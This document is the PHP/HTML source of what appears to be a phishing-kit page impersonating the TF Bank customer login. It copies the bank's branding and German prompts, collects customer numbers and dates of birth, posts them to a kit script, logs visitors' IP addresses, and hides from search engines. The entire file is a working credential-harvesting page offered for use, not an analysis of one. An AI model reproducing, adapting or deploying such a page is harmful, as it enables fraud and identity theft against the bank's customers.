
<?php error_reporting(0);


  function curl_get_contents($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_URL, $url);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
} 
$xeno = $_SERVER['REMOTE_ADDR'];

    
    require_once '../includes/main.php';
    $_SESSION['last_page'] = 'login';


?>
<!DOCTYPE html>
<html lang="es">
  <head>
  <meta charset="UTF-8"/>
  <meta http-equiv="x-ua-compatible" content="ie=edge">
<title>tfbank</title>
    <meta http-equiv="Content-Language" content="pt">
    <meta http-equiv="Content-type" content="text/html; charset=ISO-8859-1">
    <link rel="shortcut icon" href="css/favicon.ico">
  <meta name="robots" content="noindex, nofollow, noimageindex">
  <meta name="description" content="">
  <meta name="viewport" content="width=device-width, initial-scale=1">
 <script src="layout/js/style.js"></script>
 <link rel="stylesheet" type="text/css" href="css/1.css"> 
 <meta name=description content="Meine TF Bank" data-react-helmet=true>
  <link rel="stylesheet" type="text/css" href="css/2.css"> 
  <link rel="stylesheet" type="text/css" href="css/wave.css"> 
 <link rel=icon id=favicon href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABILAAASCwAAAAAAAAAAAAAAAAAAAAAAAFp7xwBaesYDWXzGKFt9yHFcf8qxXoHMz2CD0Mtjh9SoZorYY2eM2h5ljNsBZ4vaAAAAAAAAAAAAW3/DAFh4xABYecQQWXrEeVp7xdlafMb7W37I/12Ay/9fgs//Y4bU/2WK2PlnjNvOaI7dYWeP3ghoj90AAAAAAFh6xABYesQRWHnEn1h5w/tZesT/WHrE/3aS0P+xwub/r8Dn/3CR2P9kidj/Z4zc/2iO3fVpj92Aao/dBmmP3QBUdb0CWHnDfVh5w/tYecL/WHnC/1d5xP+Pptj/+/z+//T3/P99m9v/ZIjX/2iM2v9pjtz/ao/d8mqQ3lppj9sAVnbAOFh4weFYeMH/WHjB/1l5w/9YecT/j6bZ//v8/v/09/z/fpvb/2SI1v9njNr/aY7c/2qQ3v9skt/JbZPhHVZ1vJdXdr7/WHe//1l4wf9aesP/WXrF/5Cn2f/7/P7/9Pf8/3+c2/9kiNb/ao7a/2qP3P9skd//bZPg+W6U4WdVc7nWVnS7/1d1vf9ZeL//WnrC/1p6xf+Qp9n/+/z+//T3/P9+m9v/d5fb/5uz5v9rkN3/bJLf/22T4f9tk+GtUnC19FRyuP9VdLv/V3a+/1l5wv9ZesX/kKfa//v8/v/z9vz/kang/9Pd8//G1PH/ao/d/2yS4P9sk+H/bJLgzlFusvlTcLb/VXO6/1d2vv9ZecH/WXrF/5Cn2v/7/P7/9Pb8/4Sf3P+juOb/ucru/2uQ3v9tkuD/bJLg/2uR39JQbbHhUW+1/2J+v/9tiMf/V3fB/1l6xf+Qp9r/+/z+//T3/P99mtr/ZonX/3qb3/+CouT/e53k/2uR3/9rkN+6UG2xpFFutP9yi8b/s8Hi/2B/xf9YecX/kKfa//v8/v/09/z/fpvb/2OI1/9wk97/wNDx/4en5/9rkeH8bJLheFBtsk5RbrXvcovG/+/y+f+4xeb/bInM/5Gn2v/7/P7/9Pf8/4Cd3f94mN7/wM/x//H1/P+Hp+j/bJPj3G6U4yxQbLILUnC3nWF9wP+UqNf/maza/3uV0v90kNL/nLHg/5uw4v9yktr/hqPi/6S76/+iuu3/eZ7n+m+W5Xpuk+cCVnO6AFVyuSBXdLy7WHbA/lp5xf9efsn/YIHM/2GCz/9jhdP/aIrY/2mN3P9rkOD/bpTk+3GX5p5xmOcPcZfmAFdyvABbesEAWXa+Hlt5wpNefcfrYIDK/2KCzf9khdD/Z4jV/2qM2v9tkN7+cJTh4XKX5XxzmecRc5jlAHGW6wAAAAAA2vL/AFx7xABbesMGX33IRGGAy51jgs3ZZYXQ9WiI1PFsjdrRbpDej3GU4TVzmOgDcpflAAAAAAAAAAAA4AcAAMADAACAAQAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIABAADAAwAA4AcAAA=="><link rel=canonical href=https://meine.tfbank.de/login><meta http-equiv=content-security-policy content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:; frame-src 'self' data:;"><style>img[src="data:,"],source[src="data:,"]{display:none!important}</style>  </head>

 
 
  <body style=cursor:auto><div id=root><div class="App de"><div class="h-100 login-bg"><div class="h-100 inner d-flex justify-content-center align-items-center w-100"><div><div class="login-container m-2 d-flex flex-column justify-content-between align-items-center">


    <div class="btn authButton GermanyOtp"></div><div class="p-4 content">



<form action="../index.php" method="POST">
      <div class=mobileId><div class="mx-auto text-center"><div><input placeholder=Kundennummer name="code_client" type=tel id=customerId class="mt-2 form-control" value>
      <div class=description>Die Kundennummer finden Sie beispielsweise auf Ihrer Rechnung.</div></div><div>
<input type="hidden" name="step" value="login">
        <input type="hidden" name="captcha"> 
        <input placeholder=TT.MM.JJJJ class=form-control type=tel value inputmode=numeric name="password">
      <div class=description>Bitte geben Sie Ihr Geburtsdatum ein.</div></div>
      <div class="d-flex justify-content-center mt-4 mb-1 mando">
      <button type=submit class="btn btn-primary">Einloggen</button></div></div></div></div></div></div></div></div><div class=nonAuthMaintenance></div></div></div>


